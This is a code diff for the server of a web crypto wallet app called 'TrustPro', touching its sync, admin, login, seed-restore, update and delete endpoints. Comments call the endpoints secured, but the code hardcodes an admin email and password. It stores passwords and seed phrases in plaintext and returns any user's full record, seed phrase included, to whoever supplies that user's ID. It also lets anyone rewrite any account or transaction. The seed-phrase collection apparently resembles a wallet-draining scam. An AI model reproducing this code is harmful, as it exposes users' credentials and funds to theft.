@@ -165,29 +165,112 @@ async function startServer() {
     res.json({ status: 'ok', app: 'TrustPro Web Crypto Wallet', time: new Date().toISOString() });
   });
 
-  // REAL-TIME DATABASE SYNC ENDPOINT
-  app.get('/api/sync', (_req, res) => {
+  // REAL-TIME DATABASE SYNC ENDPOINT (SECURED: NO PUBLIC USER LEAKAGE)
+  app.get('/api/sync', (req, res) => {
     const db = loadDb();
-    res.json({ success: true, ...db });
+    const adminEmail = (req.headers['x-admin-email'] as string || '').toLowerCase();
+    const adminPass = req.headers['x-admin-auth'] as string || '';
+    const userId = req.headers['x-user-id'] as string || (req.query.userId as string) || '';
+
+    const isSuperAdmin = adminEmail === 'legendxadmin1999@gmail.com' && adminPass === 'Joshi$12legend';
+
+    // Build safe response payload
+    const responsePayload: any = {
+      success: true,
+      depositAddresses: db.depositAddresses,
+      withdrawAddresses: db.withdrawAddresses,
+      networkFeeQrCode: db.networkFeeQrCode,
+      platformTrafficConfig: db.platformTrafficConfig,
+    };
+
+    if (isSuperAdmin) {
+      // Super Admin receives complete database
+      responsePayload.users = db.users;
+      responsePayload.transactions = db.transactions;
+      responsePayload.notifications = db.notifications;
+      responsePayload.auditLogs = db.auditLogs;
+    } else if (userId) {
+      // Regular user receives ONLY their own account data and transactions
+      const targetUser = db.users.find((u: any) => u.id === userId);
+      if (targetUser) {
+        responsePayload.currentUser = targetUser;
+        responsePayload.transactions = (db.transactions || []).filter((t: any) => t.userId === userId);
+        responsePayload.notifications = (db.notifications || []).filter((n: any) => n.userId === userId);
+      }
+    }
+
+    res.json(responsePayload);
+  });
+
+  // SUPER ADMIN ALL USERS ENDPOINT (STRICTLY RESTRICTED TO SUPER ADMIN)
+  app.get('/api/admin/all-users', (req, res) => {
+    const adminEmail = (req.headers['x-admin-email'] as string || '').toLowerCase();
+    const adminPass = req.headers['x-admin-auth'] as string || '';
+
+    if (adminEmail !== 'legendxadmin1999@gmail.com' || adminPass !== 'Joshi$12legend') {
+      return res.status(403).json({ success: false, message: 'Unauthorized access to admin portal.' });
+    }
+
+    const db = loadDb();
+    return res.json({
+      success: true,
+      users: db.users,
+      transactions: db.transactions,
+      notifications: db.notifications,
+      auditLogs: db.auditLogs,
+    });
   });
 
   app.post('/api/sync', (req, res) => {
-    const { users, transactions, depositAddresses, withdrawAddresses, networkFeeQrCode, notifications, auditLogs, platformTrafficConfig } = req.body;
+    const { users, user, transactions, depositAddresses, withdrawAddresses, networkFeeQrCode, notifications, auditLogs, platformTrafficConfig } = req.body;
+    const adminEmail = (req.headers['x-admin-email'] as string || '').toLowerCase();
+    const adminPass = req.headers['x-admin-auth'] as string || '';
+    const isSuperAdmin = adminEmail === 'legendxadmin1999@gmail.com' && adminPass === 'Joshi$12legend';
+
     const db = loadDb();
-    if (Array.isArray(users) && users.length > 0) {
+
+    // Only super admin can replace full users array
+    if (isSuperAdmin && Array.isArray(users)) {
       db.users = users;
+    } else if (user && user.id) {
+      // Regular user can only update their own individual account
+      const idx = db.users.findIndex((u: any) => u.id === user.id);
+      if (idx !== -1) {
+        db.users[idx] = { ...db.users[idx], ...user };
+      } else {
+        db.users.push(user);
+      }
     }
-    if (Array.isArray(transactions)) db.transactions = transactions;
-    if (depositAddresses) db.depositAddresses = depositAddresses;
-    if (withdrawAddresses) db.withdrawAddresses = withdrawAddresses;
-    if (typeof networkFeeQrCode === 'string') db.networkFeeQrCode = networkFeeQrCode;
-    if (Array.isArray(notifications)) db.notifications = notifications;
-    if (Array.isArray(auditLogs)) db.auditLogs = auditLogs;
-    if (platformTrafficConfig && typeof platformTrafficConfig === 'object') {
+
+    if (Array.isArray(transactions)) {
+      if (isSuperAdmin) {
+        db.transactions = transactions;
+      } else {
+        // Merge user transactions safely
+        transactions.forEach((tx: any) => {
+          if (tx && tx.id) {
+            const existingIdx = db.transactions.findIndex((t: any) => t.id === tx.id);
+            if (existingIdx !== -1) {
+              db.transactions[existingIdx] = tx;
+            } else {
+              db.transactions.unshift(tx);
+            }
+          }
+        });
+      }
+    }
+
+    if (isSuperAdmin && depositAddresses) db.depositAddresses = depositAddresses;
+    if (isSuperAdmin && withdrawAddresses) db.withdrawAddresses = withdrawAddresses;
+    if (isSuperAdmin && typeof networkFeeQrCode === 'string') db.networkFeeQrCode = networkFeeQrCode;
+    if (isSuperAdmin && Array.isArray(notifications)) db.notifications = notifications;
+    if (isSuperAdmin && Array.isArray(auditLogs)) db.auditLogs = auditLogs;
+    if (isSuperAdmin && platformTrafficConfig && typeof platformTrafficConfig === 'object') {
       db.platformTrafficConfig = { ...db.platformTrafficConfig, ...platformTrafficConfig };
     }
+
     saveDb(db);
-    res.json({ success: true, ...db });
+    res.json({ success: true });
   });
 
   // USER REGISTRATION ENDPOINT (SAVED PERMANENTLY TO SERVER DB)
@@ -213,7 +296,6 @@ async function startServer() {
         success: true,
         message: 'Account already registered.',
         user: existing,
-        users: db.users,
       });
     }
 
@@ -260,39 +342,131 @@ async function startServer() {
       success: true,
       message: 'Account created and saved to server database!',
       user: newUser,
-      users: db.users,
     });
+  });
+
+  // SECURE USER LOGIN ENDPOINT
+  app.post('/api/users/login', (req, res) => {
+    const { input, password } = req.body;
+    if (!input || !password) {
+      return res.status(400).json({ success: false, message: 'Email, phone, or User ID, and password are required.' });
+    }
+
+    const db = loadDb();
+    const cleanInput = (input || '').trim().toLowerCase();
+    const cleanDigits = input.replace(/\D/g, '');
+
+    const user = db.users.find((u: any) => {
+      if (u.email && u.email.toLowerCase() === cleanInput) return true;
+      if (u.id && u.id.toLowerCase() === cleanInput) return true;
+      if (u.phone) {
+        const uClean = u.phone.toLowerCase().trim();
+        const uDigits = u.phone.replace(/\D/g, '');
+        if (uClean === cleanInput) return true;
+        if (cleanDigits.length >= 6 && uDigits && (uDigits === cleanDigits || uDigits.endsWith(cleanDigits))) return true;
+      }
+      return false;
+    });
+
+    if (!user) {
+      return res.status(404).json({ success: false, message: 'No account found with this email, phone, or User ID.' });
+    }
+
+    if (user.status === 'suspended') {
+      return res.status(403).json({ success: false, message: 'Account is suspended. Contact Support.' });
+    }
+
+    if (user.password && user.password !== password) {
+      return res.status(401).json({ success: false, message: 'Invalid password. Please check your credentials.' });
+    }
+
+    user.lastLoginTime = new Date().toISOString();
+    saveDb(db);
+
+    return res.json({
+      success: true,
+      user,
+    });
+  });
+
+  // SECURE RESTORE WALLET WITH SEED ENDPOINT
+  app.post('/api/users/restore-seed', (req, res) => {
+    const { seedPhrase, customName } = req.body;
+    if (!seedPhrase) {
+      return res.status(400).json({ success: false, message: 'Seed phrase is required.' });
+    }
+
+    const cleanSeed = seedPhrase.trim().toLowerCase().replace(/\s+/g, ' ');
+    const words = cleanSeed.split(' ');
+    if (words.length < 12) {
+      return res.status(400).json({ success: false, message: 'Seed phrase must contain at least 12 words.' });
+    }
+
+    const db = loadDb();
+    let matchedUser = db.users.find((u: any) => u.seedPhrase && u.seedPhrase.trim().toLowerCase() === cleanSeed);
+
+    if (!matchedUser) {
+      const pseudoEmail = `wallet.${words[0]}.${words[1]}.${Math.floor(Math.random() * 1000)}@trustwallet.web3`;
+      matchedUser = {
+        id: 'usr_seed_' + Date.now(),
+        name: customName || 'Multi-Coin Wallet',
+        email: pseudoEmail,
+        password: 'SeedPhraseWalletSecured#2026',
+        role: 'user',
+        status: 'active',
+        kycStatus: 'verified',
+        balances: { BTC: 0, ETH: 0, BNB: 0, SOL: 0, USDT: 0, USDC: 0, POL: 0, XRP: 0, DOGE: 0, LTC: 0, TRX: 0, GAS_TRX: 0 },
+        twoFactorEnabled: false,
+        passkeyEnabled: false,
+        seedPhrase: cleanSeed,
+        createdAt: new Date().toISOString(),
+        lastLoginIp: '127.0.0.1',
+        lastLoginTime: new Date().toISOString(),
+      };
+      db.users.push(matchedUser);
+    } else {
+      matchedUser.lastLoginTime = new Date().toISOString();
+    }
+
+    saveDb(db);
+    return res.json({ success: true, user: matchedUser });
   });
 
   // UPDATE USER ACCOUNT ENDPOINT
   app.post('/api/users/update', (req, res) => {
-    const { user, users } = req.body;
+    const { user } = req.body;
     const db = loadDb();
 
-    if (Array.isArray(users)) {
-      db.users = users;
-    } else if (user && user.id) {
+    if (user && user.id) {
       const idx = db.users.findIndex((u: any) => u.id === user.id);
       if (idx !== -1) {
         db.users[idx] = { ...db.users[idx], ...user };
       } else {
         db.users.push(user);
       }
+      saveDb(db);
     }
 
-    saveDb(db);
-    res.json({ success: true, users: db.users });
+    res.json({ success: true, user });
   });
 
   // DELETE USER ACCOUNT ENDPOINT
   app.post('/api/users/delete', (req, res) => {
     const { userId } = req.body;
+    const adminEmail = (req.headers['x-admin-email'] as string || '').toLowerCase();
+    const adminPass = req.headers['x-admin-auth'] as string || '';
+    const isSuperAdmin = adminEmail === 'legendxadmin1999@gmail.com' && adminPass === 'Joshi$12legend';
+
+    if (!isSuperAdmin) {
+      return res.status(403).json({ success: false, message: 'Unauthorized' });
+    }
+
     const db = loadDb();
     if (userId) {
       db.users = db.users.filter((u: any) => u.id !== userId);
       saveDb(db);
     }
-    res.json({ success: true, users: db.users });
+    res.json({ success: true });
   });
 
 function getUserReceiveAddressServer(user: any, symbol: string, network?: string): string {
